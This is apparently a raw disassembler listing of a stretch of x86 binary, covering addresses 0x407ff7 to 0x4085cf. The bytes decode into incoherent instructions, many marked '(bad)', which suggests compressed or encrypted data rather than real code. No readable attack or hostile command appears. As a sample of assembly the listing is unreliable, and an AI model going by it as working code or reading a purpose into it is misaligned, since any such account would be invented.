  407ff7:	05 04 c0 08 81       	add    $0x8108c004,%eax
  407ffc:	ce                   	into
  407ffd:	0d fd 16 14 b3       	or     $0xb31416fd,%eax
  408002:	f0 46                	lock inc %esi
  408004:	24 ae                	and    $0xae,%al
  408006:	2b d4                	sub    %esp,%edx
  408008:	7d 05                	jge    0x40800f
  40800a:	3b 50 16             	cmp    0x16(%eax),%edx
  40800d:	b5 06                	mov    $0x6,%ch
  40800f:	46                   	inc    %esi
  408010:	3d 3f 27 13 a1       	cmp    $0xa113273f,%eax
  408015:	c2 5f 64             	ret    $0x645f
  408018:	cc                   	int3
  408019:	84 8e 1f 1e d7 f3    	test   %cl,-0xc28e1e1(%esi)
  40801f:	ad                   	lods   %ds:(%esi),%eax
  408020:	fe 45 27             	incb   0x27(%ebp)
  408023:	a9 f5 2e 9c e8       	test   $0xe89c2ef5,%eax
  408028:	ef                   	out    %eax,(%dx)
  408029:	fc                   	cld
  40802a:	8d 35 a9 11 1c db    	lea    0xdb1c11a9,%esi
  408030:	b9 56 39 01 e9       	mov    $0xe9013956,%ecx
  408035:	0d 35 a7 9c 2a       	or     $0x2a9ca735,%eax
  40803a:	cd 92                	int    $0x92
  40803c:	6a 63                	push   $0x63
  40803e:	9e                   	sahf
  40803f:	33 c9                	xor    %ecx,%ecx
  408041:	1d 92 99 13 f9       	sbb    $0xf9139992,%eax
  408046:	b8 25 c7 59 73       	mov    $0x7359c725,%eax
  40804b:	4d                   	dec    %ebp
  40804c:	25 7b 41 e3 0e       	and    $0xee3417b,%eax
  408051:	1b 07                	sbb    (%edi),%eax
  408053:	37                   	aaa
  408054:	18 b2 3e f5 09 86    	sbb    %dh,-0x79f60ac2(%edx)
  40805a:	28 ef                	sub    %ch,%bh
  40805c:	10 e9                	adc    %ch,%cl
  40805e:	13 f3                	adc    %ebx,%esi
  408060:	28 e9                	sub    %ch,%cl
  408062:	9e                   	sahf
  408063:	b0 5a                	mov    $0x5a,%al
  408065:	c6 80 f7 ad fb 3d c4 	movb   $0xc4,0x3dfbadf7(%eax)
  40806c:	1c bb                	sbb    $0xbb,%al
  40806e:	04 ea                	add    $0xea,%al
  408070:	ac                   	lods   %ds:(%esi),%al
  408071:	8e 3f                	mov    (%edi),%?
  408073:	02 01                	add    (%ecx),%al
  408075:	77 56                	ja     0x4080cd
  408077:	87 3b                	xchg   %edi,(%ebx)
  408079:	03 ea                	add    %edx,%ebp
  40807b:	03 03                	add    (%ebx),%eax
  40807d:	2b 7e 51             	sub    0x51(%esi),%edi
  408080:	67 01 04             	add    %eax,(%si)
  408083:	56                   	push   %esi
  408084:	ab                   	stos   %eax,%es:(%edi)
  408085:	94                   	xchg   %eax,%esp
  408086:	21 04 66             	and    %eax,(%esi,%eiz,2)
  408089:	80 8b 43 3f 43 e0 8d 	orb    $0x8d,-0x1fbcc0bd(%ebx)
  408090:	1c 2d                	sbb    $0x2d,%al
  408092:	0b 5b 8e             	or     -0x72(%ebx),%ebx
  408095:	19 50 bd             	sbb    %edx,-0x43(%eax)
  408098:	4f                   	dec    %edi
  408099:	75 56                	jne    0x4080f1
  40809b:	e4 d1                	in     $0xd1,%al
  40809d:	39 2b                	cmp    %ebp,(%ebx)
  40809f:	06                   	push   %es
  4080a0:	50                   	push   %eax
  4080a1:	da f3                	(bad)
  4080a3:	10 34 72             	adc    %dh,(%edx,%esi,2)
  4080a6:	04 31                	add    $0x31,%al
  4080a8:	d5 19                	aad    $0x19
  4080aa:	b6 70                	mov    $0x70,%dh
  4080ac:	2b 6b a5             	sub    -0x5b(%ebx),%ebp
  4080af:	8f                   	(bad)
  4080b0:	8e d3                	mov    %ebx,%ss
  4080b2:	1a 43 6d             	sbb    0x6d(%ebx),%al
  4080b5:	c8 9e 65 fe          	enter  $0x659e,$0xfe
  4080b9:	02 3b                	add    (%ebx),%bh
  4080bb:	9a 68 75 47 2b f1 88 	lcall  $0x88f1,$0x2b477568
  4080c2:	f6 89 fa 5c 85 31 2b 	testb  $0x2b,0x31855cfa(%ecx)
  4080c9:	a2 95 02 68 b5       	mov    %al,0xb5680295
  4080ce:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4080cf:	73 65                	jae    0x408136
  4080d1:	75 fc                	jne    0x4080cf
  4080d3:	f1                   	int1
  4080d4:	1e                   	push   %ds
  4080d5:	06                   	push   %es
  4080d6:	03 02                	add    (%edx),%eax
  4080d8:	d1 10                	rcll   $1,(%eax)
  4080da:	2f                   	das
  4080db:	6a 3f                	push   $0x3f
  4080dd:	05 d2 ec 75 56       	add    $0x5675ecd2,%eax
  4080e2:	04 3b                	add    $0x3b,%al
  4080e4:	3f                   	aas
  4080e5:	ea 70 92 05 02 02 c7 	ljmp   $0xc702,$0x2059270
  4080ec:	1d bf ce 02 c5       	sbb    $0xc502cebf,%eax
  4080f1:	05 02 d6 93 55       	add    $0x5593d602,%eax
  4080f6:	e7 02                	out    %eax,$0x2
  4080f8:	23 df                	and    %edi,%ebx
  4080fa:	b4 db                	mov    $0xdb,%ah
  4080fc:	41                   	inc    %ecx
  4080fd:	03 8c 70 9e 65 58 11 	add    0x1158659e(%eax,%esi,2),%ecx
  408104:	72 31                	jb     0x408137
  408106:	e2 b9                	loop   0x4080c1
  408108:	16                   	push   %ss
  408109:	67 84 43 5c          	test   %al,0x5c(%bp,%di)
  40810d:	01 f5                	add    %esi,%ebp
  40810f:	e8 02 03 59 f9       	call   0xf9998416
  408114:	03 6b 3a             	add    0x3a(%ebx),%ebp
  408117:	57                   	push   %edi
  408118:	37                   	aaa
  408119:	d1 3e                	sarl   $1,(%esi)
  40811b:	17                   	pop    %ss
  40811c:	67 fb                	addr16 sti
  40811e:	11 d7                	adc    %edx,%edi
  408120:	e2 a6                	loop   0x4080c8
  408122:	a9 46 d2 66 e1       	test   $0xe166d246,%eax
  408127:	28 03                	sub    %al,(%ebx)
  408129:	b1 72                	mov    $0x72,%cl
  40812b:	cc                   	int3
  40812c:	64 25 86 55 cd 54    	fs and $0x54cd5586,%eax
  408132:	a9 fb fd 57 cd       	test   $0xcd57fdfb,%eax
  408137:	58                   	pop    %eax
  408138:	8f 2a 46 7d          	(bad)
  40813c:	52                   	push   %edx
  40813d:	7c 24                	jl     0x408163
  40813f:	8f                   	(bad)
  408140:	b3 66                	mov    $0x66,%bl
  408142:	28 dc                	sub    %bl,%ah
  408144:	06                   	push   %es
  408145:	03 de                	add    %esi,%ebx
  408147:	27                   	daa
  408148:	ab                   	stos   %eax,%es:(%edi)
  408149:	ce                   	into
  40814a:	03 1f                	add    (%edi),%ebx
  40814c:	de 8c 33 3e 04 3a ed 	fimuls -0x12c5fbc2(%ebx,%esi,1)
  408153:	87 64 be 16          	xchg   %esp,0x16(%esi,%edi,4)
  408157:	a2 62 05 0b 39       	mov    %al,0x390b0562
  40815c:	8d a2 75 35 23 3f    	lea    0x3f233575(%edx),%esp
  408162:	c1 c8 28             	ror    $0x28,%eax
  408165:	81 48 e9 01 9f a5 a3 	orl    $0xa3a59f01,-0x17(%eax)
  40816c:	e8 fc f5 21 27       	call   0x2762776d
  408171:	60                   	pusha
  408172:	22 a2 97 4c 2f 80    	and    -0x7fd0b369(%edx),%ah
  408178:	71 cf                	jno    0x408149
  40817a:	51                   	push   %ecx
  40817b:	44                   	inc    %esp
  40817c:	02 38                	add    (%eax),%bh
  40817e:	07                   	pop    %es
  40817f:	7b 0e                	jnp    0x40818f
  408181:	0d 2c c8 00 b0       	or     $0xb000c82c,%eax
  408186:	00 d5                	add    %dl,%ch
  408188:	39 4a 84             	cmp    %ecx,-0x7c(%edx)
  40818b:	15 8e df 13 25       	adc    $0x2513df8e,%eax
  408190:	a8 fd                	test   $0xfd,%al
  408192:	9e                   	sahf
  408193:	e7 39                	out    %eax,$0x39
  408195:	2c 98                	sub    $0x98,%al
  408197:	78 68                	js     0x408201
  408199:	58                   	pop    %eax
  40819a:	be a9 e8 79 48       	mov    $0x4879e8a9,%esi
  40819f:	38 cb                	cmp    %cl,%bl
  4081a1:	77 79                	ja     0x40821c
  4081a3:	9c                   	pushf
  4081a4:	5c                   	pop    %esp
  4081a5:	e8 cb f2 59 1e       	call   0x1e9a7475
  4081aa:	94                   	xchg   %eax,%esp
  4081ab:	3c 34                	cmp    $0x34,%al
  4081ad:	99                   	cltd
  4081ae:	70 a3                	jo     0x408153
  4081b0:	91                   	xchg   %eax,%ecx
  4081b1:	91                   	xchg   %eax,%ecx
  4081b2:	1f                   	pop    %ds
  4081b3:	12 1b                	adc    (%ebx),%bl
  4081b5:	71 f3                	jno    0x4081aa
  4081b7:	48                   	dec    %eax
  4081b8:	55                   	push   %ebp
  4081b9:	66 d5 38             	data16 aad $0x38
  4081bc:	02 92 02 cb 7b 71    	add    0x717bcb02(%edx),%dl
  4081c2:	ba 2f d8 c4 95       	mov    $0x95c4d82f,%edx
  4081c7:	84 f2                	test   %dh,%dl
  4081c9:	be 04 78 12 fc       	mov    $0xfc127804,%esi
  4081ce:	94                   	xchg   %eax,%esp
  4081cf:	0f 3c                	(bad)
  4081d1:	f5                   	cmc
  4081d2:	34 02                	xor    $0x2,%al
  4081d4:	7a db                	jp     0x4081b1
  4081d6:	a0 a4 a6 9c 29       	mov    0x299ca6a4,%al
  4081db:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4081dc:	e3 a0                	jecxz  0x40817e
  4081de:	0a 79 01             	or     0x1(%ecx),%bh
  4081e1:	f1                   	int1
  4081e2:	3e 12 51 50          	adc    %ds:0x50(%ecx),%dl
  4081e6:	28 0b                	sub    %cl,(%ebx)
  4081e8:	3d cf 61 18 08       	cmp    $0x81861cf,%eax
  4081ed:	bb 47 84 08 56       	mov    $0x56088447,%ebx
  4081f2:	7a 21                	jp     0x408215
  4081f4:	84 27                	test   %ah,(%edi)
  4081f6:	28 cc                	sub    %cl,%ah
  4081f8:	c2 b1 d0             	ret    $0xd0b1
  4081fb:	35 00 9b 08 46       	xor    $0x46089b00,%eax
  408200:	8a 47 0b             	mov    0xb(%edi),%al
  408203:	f4                   	hlt
  408204:	14 41                	adc    $0x41,%al
  408206:	d3 96 64 e8 18 ff    	rcll   %cl,-0xe7179c(%esi)
  40820c:	fc                   	cld
  40820d:	6d                   	insl   (%dx),%es:(%edi)
  40820e:	c1 71 27 f8          	shll   $0xf8,0x27(%ecx)
  408212:	fe                   	(bad)
  408213:	e8 42 57 d2 7c       	call   0x7d12d95a
  408218:	fe                   	(bad)
  408219:	f3 a3 fa 16 27 b8    	repz mov %eax,0xb82716fa
  40821f:	a8 a8                	test   $0xa8,%al
  408221:	f4                   	hlt
  408222:	a3 3a ce 98 78       	mov    %eax,0x7898ce3a
  408227:	68 25 6c d9 a8       	push   $0xa8d96c25
  40822c:	27                   	daa
  40822d:	d0 8d 88 16 ff 91    	rorb   $1,-0x6e00e978(%ebp)
  408233:	16                   	push   %ss
  408234:	76 39                	jbe    0x40826f
  408236:	90                   	nop
  408237:	51                   	push   %ecx
  408238:	8d 66 d8             	lea    -0x28(%esi),%esp
  40823b:	f4                   	hlt
  40823c:	da c6                	fcmovb %st(6),%st
  40823e:	8e 98 00 5a 15 12    	mov    0x12155a00(%eax),%ds
  408244:	f5                   	cmc
  408245:	a2 0d 81 3b 88       	mov    %al,0x883b810d
  40824a:	e4 27                	in     $0x27,%al
  40824c:	0c 67                	or     $0x67,%al
  40824e:	e1 7c                	loope  0x4082cc
  408250:	9c                   	pushf
  408251:	68 72 d8 d8 89       	push   $0x89d8d872
  408256:	89 5e 82             	mov    %ebx,-0x7e(%esi)
  408259:	d7                   	xlat   %ds:(%ebx)
  40825a:	71 a2                	jno    0x4081fe
  40825c:	3a 36                	cmp    (%esi),%dh
  40825e:	0c 08                	or     $0x8,%al
  408260:	d2 3d 0a f8 00 75    	sarb   %cl,0x7500f80a
  408266:	c0 4b 7f f4          	rorb   $0xf4,0x7f(%ebx)
  40826a:	75 9f                	jne    0x40820b
  40826c:	1a 71 6c             	sbb    0x6c(%ecx),%dh
  40826f:	10 a7 17 79 8c 34    	adc    %ah,0x348c7917(%edi)
  408275:	d0 15 e9 0e bb 69    	rclb   $1,0x69bb0ee9
  40827b:	b2 27                	mov    $0x27,%dl
  40827d:	ba e5 1e 52 ba       	mov    $0xba521ee5,%edx
  408282:	26 64 b7 00          	es fs mov $0x0,%bh
  408286:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408287:	a3 42 17 bb 27       	mov    %eax,0x27bb1742
  40828c:	a8 98                	test   $0x98,%al
  40828e:	75 7c                	jne    0x40830c
  408290:	cb                   	lret
  408291:	f3 98                	repz cwtl
  408293:	78 68                	js     0x4082fd
  408295:	eb 91                	jmp    0x408228
  408297:	e7 47                	out    %eax,$0x47
  408299:	58                   	pop    %eax
  40829a:	58                   	pop    %eax
  40829b:	38 23                	cmp    %ah,(%ebx)
  40829d:	ef                   	out    %eax,(%dx)
  40829e:	da 38                	fidivrl (%eax)
  4082a0:	54                   	push   %esp
  4082a1:	18 a8 32 42 86 e6    	sbb    %ch,-0x1979bdce(%eax)
  4082a7:	78 31                	js     0x4082da
  4082a9:	43                   	inc    %ebx
  4082aa:	9b                   	fwait
  4082ab:	26 e8 8f 75 54 0f    	es call 0xf94f840
  4082b1:	69 ae 50 a8 ca d6 ea 	imul   $0xd1d510ea,-0x293557b0(%esi),%ebp
  4082b8:	10 d5 d1 
  4082bb:	1f                   	pop    %ds
  4082bc:	eb 6a                	jmp    0x408328
  4082be:	08 4c 03 21          	or     %cl,0x21(%ebx,%eax,1)
  4082c2:	67 9d                	addr16 popf
  4082c4:	1c 05                	sbb    $0x5,%al
  4082c6:	61                   	popa
  4082c7:	b8 2c a8 0b 11       	mov    $0x110ba82c,%eax
  4082cc:	31 48 ff             	xor    %ecx,-0x1(%eax)
  4082cf:	2c b9                	sub    $0xb9,%al
  4082d1:	89 ee                	mov    %ebp,%esi
  4082d3:	22 28                	and    (%eax),%ch
  4082d5:	22 ce                	and    %dh,%cl
  4082d7:	04 7a                	add    $0x7a,%al
  4082d9:	57                   	push   %edi
  4082da:	aa                   	stos   %al,%es:(%edi)
  4082db:	db f0                	fcomi  %st(0),%st
  4082dd:	e1 c1                	loope  0x4082a0
  4082df:	87 09                	xchg   %ecx,(%ecx)
  4082e1:	b6 20                	mov    $0x20,%dh
  4082e3:	c7 42 1c 04 05 69 97 	movl   $0x97690504,0x1c(%edx)
  4082ea:	b9 f3 52 7a cb       	mov    $0xcb7a52f3,%ecx
  4082ef:	b6 38                	mov    $0x38,%dh
  4082f1:	18 b1 43 4a cb 71    	sbb    %dh,0x71cb4a43(%ecx)
  4082f7:	b4 9e                	mov    $0x9e,%ah
  4082f9:	14 08                	adc    $0x8,%al
  4082fb:	36 0b 68 93          	or     %ss:-0x6d(%eax),%ebp
  4082ff:	05 a5 a2 12 80       	add    $0x8012a2a5,%eax
  408304:	9e                   	sahf
  408305:	6b 8a fb b4 4f c6 e0 	imul   $0xffffffe0,-0x39b04b05(%edx),%ecx
  40830c:	42                   	inc    %edx
  40830d:	28 8b e3 ca 43 1a    	sub    %cl,0x1a43cae3(%ebx)
  408313:	f6 02 67             	testb  $0x67,(%edx)
  408316:	29 fe                	sub    %edi,%esi
  408318:	ae                   	scas   %es:(%edi),%al
  408319:	28 dc                	sub    %bl,%ah
  40831b:	f6 9c b6 12 e3 46 f0 	negb   -0xfb91cee(%esi,%esi,4)
  408322:	ab                   	stos   %eax,%es:(%edi)
  408323:	13 4e 2b             	adc    0x2b(%esi),%ecx
  408326:	16                   	push   %ss
  408327:	8d                   	lea    (bad),%esp
  408328:	e5 92                	in     $0x92,%eax
  40832a:	af                   	scas   %es:(%edi),%eax
  40832b:	11 75 46             	adc    %esi,0x46(%ebp)
  40832e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40832f:	20 38                	and    %bh,(%eax)
  408331:	43                   	inc    %ebx
  408332:	46                   	inc    %esi
  408333:	48                   	dec    %eax
  408334:	26 2d 0f 33 c8 fd    	es sub $0xfdc8330f,%eax
  40833a:	14 98                	adc    $0x98,%al
  40833c:	a2 86 bc cb a5       	mov    %al,0xa5cbbc86
  408341:	05 3c 50 15 89       	add    $0x8915503c,%eax
  408346:	9b                   	fwait
  408347:	20 57 25             	and    %dl,0x25(%edi)
  40834a:	83 19 05             	sbbl   $0x5,(%ecx)
  40834d:	43                   	inc    %ebx
  40834e:	14 ca                	adc    $0xca,%al
  408350:	d3 bd b4 32 1d 8c    	sarl   %cl,-0x73e2cd4c(%ebp)
  408356:	77 08                	ja     0x408360
  408358:	0b 94 13 df 7e 04 fe 	or     -0x1fb8121(%ebx,%edx,1),%edx
  40835f:	4a                   	dec    %edx
  408360:	46                   	inc    %esi
  408361:	90                   	nop
  408362:	bf 90 fa 84 fd       	mov    $0xfd84fa90,%edi
  408367:	f0 02 73 a4          	lock add -0x5c(%ebx),%dh
  40836b:	17                   	pop    %ss
  40836c:	00 4e cd             	add    %cl,-0x33(%esi)
  40836f:	0a 12                	or     (%edx),%dl
  408371:	16                   	push   %ss
  408372:	04 fe                	add    $0xfe,%al
  408374:	0b 18                	or     (%eax),%ebx
  408376:	25 15 b2 85 23       	and    $0x2385b215,%eax
  40837b:	80 fd 7c             	cmp    $0x7c,%ch
  40837e:	fd                   	std
  40837f:	90                   	nop
  408380:	75 30                	jne    0x4083b2
  408382:	f5                   	cmc
  408383:	23 a2 91 b0 81 b6    	and    -0x497e4f6f(%edx),%esp
  408389:	85 3c 90             	test   %edi,(%eax,%edx,4)
  40838c:	32 da                	xor    %dl,%bl
  40838e:	e1 0e                	loope  0x40839e
  408390:	7c 51                	jl     0x4083e3
  408392:	6e                   	outsb  %ds:(%esi),(%dx)
  408393:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408394:	3a d0                	cmp    %al,%dl
  408396:	8a 10                	mov    (%eax),%dl
  408398:	d0 1b                	rcrb   $1,(%ebx)
  40839a:	19 5f c2             	sbb    %ebx,-0x3e(%edi)
  40839d:	54                   	push   %esp
  40839e:	2c af                	sub    $0xaf,%al
  4083a0:	b5 da                	mov    $0xda,%ch
  4083a2:	b7 1c                	mov    $0x1c,%bh
  4083a4:	13 62 ca             	adc    -0x36(%edx),%esp
  4083a7:	9c                   	pushf
  4083a8:	d4 b2                	aam    $0xb2
  4083aa:	fc                   	cld
  4083ab:	1b 64 11 5c          	sbb    0x5c(%ecx,%edx,1),%esp
  4083af:	d4 78                	aam    $0x78
  4083b1:	6c                   	insb   (%dx),%es:(%edi)
  4083b2:	60                   	pusha
  4083b3:	fd                   	std
  4083b4:	23 5c 1e c6          	and    -0x3a(%esi,%ebx,1),%ebx
  4083b8:	e2 6d                	loop   0x408427
  4083ba:	58                   	pop    %eax
  4083bb:	50                   	push   %eax
  4083bc:	5a                   	pop    %edx
  4083bd:	ac                   	lods   %ds:(%esi),%al
  4083be:	17                   	pop    %ss
  4083bf:	29 54 fd 23          	sub    %edx,0x23(%ebp,%edi,8)
  4083c3:	50                   	push   %eax
  4083c4:	3c ce                	cmp    $0xce,%al
  4083c6:	e3 98                	jecxz  0x408360
  4083c8:	4c                   	dec    %esp
  4083c9:	70 48                	jo     0x408413
  4083cb:	1e                   	push   %ds
  4083cc:	44                   	inc    %esp
  4083cd:	97                   	xchg   %eax,%edi
  4083ce:	c7                   	(bad)
  4083cf:	f1                   	int1
  4083d0:	bd 40 1f 3c 08       	mov    $0x83c1f40,%ebp
  4083d5:	f1                   	int1
  4083d6:	38 86 38 20 34 fd    	cmp    %al,-0x2cbdfc8(%esi)
  4083dc:	e1 7b                	loope  0x408459
  4083de:	11 3c 30             	adc    %edi,(%eax,%esi,1)
  4083e1:	2c fd                	sub    $0xfd,%al
  4083e3:	36 d4 0f             	ss aam $0xf
  4083e6:	88 28                	mov    %ch,(%eax)
  4083e8:	fd                   	std
  4083e9:	cd f2                	int    $0xf2
  4083eb:	38 5b 24             	cmp    %bl,0x24(%ebx)
  4083ee:	23 20                	and    (%eax),%esp
  4083f0:	79 0b                	jns    0x4083fd
  4083f2:	12 c7                	adc    %bh,%al
  4083f4:	1c 24                	sbb    $0x24,%al
  4083f6:	67 d1 05             	roll   $1,(%di)
  4083f9:	30 76 45             	xor    %dh,0x45(%esi)
  4083fc:	bb 6d 25 29 2d       	mov    $0x2d29256d,%ebx
  408401:	76 b7                	jbe    0x4083ba
  408403:	46                   	inc    %esi
  408404:	08 e8                	or     %ch,%al
  408406:	86 3d ea 87 26 15    	xchg   %bh,0x152687ea
  40840c:	19 86 34 88 cf 5d    	sbb    %eax,0x5dcf8834(%esi)
  408412:	59                   	pop    %ecx
  408413:	35 48 de ce 3b       	xor    $0x3bcede48,%eax
  408418:	3e 28 54 29 c9       	sub    %dl,%ds:-0x37(%ecx,%ebp,1)
  40841d:	52                   	push   %edx
  40841e:	5a                   	pop    %edx
  40841f:	54                   	push   %esp
  408420:	98                   	cwtl
  408421:	58                   	pop    %eax
  408422:	cf                   	iret
  408423:	e0 96                	loopne 0x4083bb
  408425:	67 88 38             	mov    %bh,(%bx,%si)
  408428:	0c 0e                	or     $0xe,%al
  40842a:	1d b9 93 fc fc       	sbb    $0xfcfc93b9,%eax
  40842f:	ec                   	in     (%dx),%al
  408430:	fc                   	cld
  408431:	38 4e 69             	cmp    %cl,0x69(%esi)
  408434:	01 dc                	add    %ebx,%esp
  408436:	fc                   	cld
  408437:	3a cc                	cmp    %ah,%cl
  408439:	fc                   	cld
  40843a:	2b bc 70 ac d4 c6 83 	sub    -0x7c392b54(%eax,%esi,2),%edi
  408441:	f3 9c                	repz pushf
  408443:	8c fc                	mov    %?,%esp
  408445:	2c 7c                	sub    $0x7c,%al
  408447:	fc                   	cld
  408448:	38 cf                	cmp    %cl,%bh
  40844a:	d8 65 6c             	fsubs  0x6c(%ebp)
  40844d:	5c                   	pop    %esp
  40844e:	4c                   	dec    %esp
  40844f:	3c fb                	cmp    $0xfb,%al
  408451:	04 21                	add    $0x21,%al
  408453:	3c fc                	cmp    $0xfc,%al
  408455:	2d 2c fc 93 14       	sub    $0x1493fc2c,%eax
  40845a:	e7 a4                	out    %eax,$0xa4
  40845c:	96                   	xchg   %eax,%esi
  40845d:	1c 0c                	sbb    $0xc,%al
  40845f:	50                   	push   %eax
  408460:	30 91 5a 2e ec fb    	xor    %dl,-0x413d1a6(%ecx)
  408466:	dc fb                	fdivr  %st,%st(3)
  408468:	96                   	xchg   %eax,%esi
  408469:	1d 3a e0 cc fb       	sbb    $0xfbcce03a,%eax
  40846e:	3a bc fb ac fb 9c f8 	cmp    -0x7630454(%ebx,%edi,8),%bh
  408475:	5e                   	pop    %esi
  408476:	3c 78                	cmp    $0x78,%al
  408478:	8c fb                	mov    %?,%ebx
  40847a:	2d 7c fb 6c cb       	sub    $0xcb6cfb7c,%eax
  40847f:	03 6a 71             	add    0x71(%edx),%ebp
  408482:	fb                   	sti
  408483:	5c                   	pop    %esp
  408484:	4c                   	dec    %esp
  408485:	fb                   	sti
  408486:	2f                   	das
  408487:	3c 78                	cmp    $0x78,%al
  408489:	70 9e                	jo     0x408429
  40848b:	dd 2c 1c             	(bad) (%esp,%ebx,1)
  40848e:	0c fb                	or     $0xfb,%al
  408490:	30 fc                	xor    %bh,%ah
  408492:	fa                   	cli
  408493:	6c                   	insb   (%dx),%es:(%edi)
  408494:	0b 22                	or     (%edx),%esp
  408496:	0b 3a                	or     (%edx),%edi
  408498:	ec                   	in     (%dx),%al
  408499:	fa                   	cli
  40849a:	31 dc                	xor    %ebx,%esp
  40849c:	fa                   	cli
  40849d:	6c                   	insb   (%dx),%es:(%edi)
  40849e:	4c                   	dec    %esp
  40849f:	38 54 6c 38          	cmp    %dl,0x38(%esp,%ebp,2)
  4084a3:	cc                   	int3
  4084a4:	fa                   	cli
  4084a5:	bc fa ac fa 9c       	mov    $0x9cfaacfa,%esp
  4084aa:	67 e7 01             	addr16 out %eax,$0x1
  4084ad:	b7 8c                	mov    $0x8c,%bh
  4084af:	fa                   	cli
  4084b0:	32 7c 6c b9          	xor    -0x47(%esp,%ebp,2),%bh
  4084b4:	3c 90                	cmp    $0x90,%al
  4084b6:	96                   	xchg   %eax,%esi
  4084b7:	5c                   	pop    %esp
  4084b8:	4c                   	dec    %esp
  4084b9:	fa                   	cli
  4084ba:	33 3c 11             	xor    (%ecx,%edx,1),%edi
  4084bd:	1a e2                	sbb    %dl,%ah
  4084bf:	59                   	pop    %ecx
  4084c0:	2c 1c                	sub    $0x1c,%al
  4084c2:	fa                   	cli
  4084c3:	46                   	inc    %esi
  4084c4:	0c 0e                	or     $0xe,%al
  4084c6:	cc                   	int3
  4084c7:	c4 64 fc f9          	les    -0x7(%esp,%edi,8),%esp
  4084cb:	f9                   	stc
  4084cc:	34 d6                	xor    $0xd6,%al
  4084ce:	81 71 8a f9 cc f9 32 	xorl   $0x32f9ccf9,-0x76(%ecx)
  4084d5:	2e 52                	cs push %edx
  4084d7:	0f d1 87 c8 3a 04 1e 	psrlw  0x1e043ac8(%edi),%mm0
  4084de:	21 e1                	and    %esp,%ecx
  4084e0:	10 73 86             	adc    %dh,-0x7a(%ebx)
  4084e3:	5c                   	pop    %esp
  4084e4:	43                   	inc    %ebx
  4084e5:	b8 19 d2 0c 91       	mov    $0x910cd219,%eax
  4084ea:	fe ca                	dec    %dl
  4084ec:	30 04 42             	xor    %al,(%edx,%eax,2)
  4084ef:	af                   	scas   %es:(%edi),%eax
  4084f0:	e4 2b                	in     $0x2b,%al
  4084f2:	2b ea                	sub    %edx,%ebp
  4084f4:	ca bb 6c             	lret   $0x6cbb
  4084f7:	00 ae 94 36 4c 00    	add    %ch,0x4c3694(%esi)
  4084fd:	62 2f                	bound  %ebp,(%edi)
  4084ff:	fe                   	(bad)
  408500:	62                   	(bad)
  408501:	e0 72                	loopne 0x408575
  408503:	2e ef                	cs out %eax,(%dx)
  408505:	25 d0 82 2d e9       	and    $0xe92d82d0,%eax
  40850a:	00 95 fc 58 b6 fd    	add    %dl,-0x249a704(%ebp)
  408510:	25 67 e6 9a 09       	and    $0x99ae667,%eax
  408515:	01 66 90             	add    %esp,-0x70(%esi)
  408518:	99                   	cltd
  408519:	11 7a 24             	adc    %edi,0x24(%edx)
  40851c:	1f                   	pop    %ds
  40851d:	1b 29                	sbb    (%ecx),%ebp
  40851f:	47                   	inc    %edi
  408520:	d8 98 11 6a 64 06    	fcomps 0x6646a11(%eax)
  408526:	18 29                	sbb    %ch,(%ecx)
  408528:	46                   	inc    %esi
  408529:	ba 79 37 f9 90       	mov    $0x90f93779,%edx
  40852e:	6d                   	insl   (%dx),%es:(%edi)
  40852f:	c0 0d 00 1a 39 26 25 	rorb   $0x25,0x26391a00
  408536:	83 7b 1e 7f          	cmpl   $0x7f,0x1e(%ebx)
  40853a:	26 00 07             	add    %al,%es:(%edi)
  40853d:	28 88 d1 12 a2 00    	sub    %cl,0xa212d1(%eax)
  408543:	5b                   	pop    %ebx
  408544:	1b 35 7b d7 58 3d    	sbb    0x3d58d77b,%esi
  40854a:	1b 36                	sbb    (%esi),%esi
  40854c:	91                   	xchg   %eax,%ecx
  40854d:	ae                   	scas   %es:(%edi),%al
  40854e:	dc 14 1b             	fcoml  (%ebx,%ebx,1)
  408551:	37                   	aaa
  408552:	0b 39                	or     (%ecx),%edi
  408554:	b6 5e                	mov    $0x5e,%dh
  408556:	95                   	xchg   %eax,%ebp
  408557:	f3 39 2f             	repz cmp %ebp,(%edi)
  40855a:	12 39                	adc    (%ecx),%bh
  40855c:	c1 8e 2d 1b 3a b3 a3 	rorl   $0xa3,-0x4cc5e4d3(%esi)
  408563:	9c                   	pushf
  408564:	4d                   	dec    %ebp
  408565:	38 22                	cmp    %ah,(%edx)
  408567:	7c 28                	jl     0x408591
  408569:	bc fe 1f 6a 07       	mov    $0x76a1ffe,%esp
  40856e:	04 d9                	add    $0xd9,%al
  408570:	e7 20                	out    %eax,$0x20
  408572:	34 35                	xor    $0x35,%al
  408574:	04 8d                	add    $0x8d,%al
  408576:	df 84 73 fd fe 3b 00 	filds  0x3bfefd(%ebx,%esi,2)
  40857d:	80 4f 72 95          	orb    $0x95,0x72(%edi)
  408581:	0b 89 23 89 13 3c    	or     0x3c138923(%ecx),%ecx
  408587:	00 18                	add    %bl,(%eax)
  408589:	a3 36 8a 9d 04       	mov    %eax,0x49d8a36
  40858e:	00 bc 1b 3d c6 e2 e3 	add    %bh,-0x1c1d39c3(%ebx,%ebx,1)
  408595:	67 13 3e 1f 9f       	adc    -0x60e1,%edi
  40859a:	ff a0 4c 17 b9 1d    	jmp    *0x1db9174c(%eax)
  4085a0:	1f                   	pop    %ds
  4085a1:	1f                   	pop    %ds
  4085a2:	74 17                	je     0x4085bb
  4085a4:	50                   	push   %eax
  4085a5:	16                   	push   %ss
  4085a6:	93                   	xchg   %eax,%ebx
  4085a7:	83 ac 54 50 e3 fe 41 	subl   $0x6e,0x41fee350(%esp,%edx,2)
  4085ae:	6e 
  4085af:	17                   	pop    %ss
  4085b0:	e7 03                	out    %eax,$0x3
  4085b2:	c3                   	ret
  4085b3:	ec                   	in     (%dx),%al
  4085b4:	17                   	pop    %ss
  4085b5:	13 e3                	adc    %ebx,%esp
  4085b7:	c6                   	(bad)
  4085b8:	99                   	cltd
  4085b9:	66 04 01             	data16 add $0x1,%al
  4085bc:	51                   	push   %ecx
  4085bd:	bd 49 7d 3e 84       	mov    $0x843e7d49,%ebp
  4085c2:	db 32                	(bad) (%edx)
  4085c4:	1c ba                	sbb    $0xba,%al
  4085c6:	56                   	push   %esi
  4085c7:	83 b7 22 c1 43 92 03 	xorl   $0x3,-0x6dbc3ede(%edi)
  4085ce:	ec                   	in     (%dx),%al
  4085cf:	e8 31 c0 05 8c       	call   0x8c464605
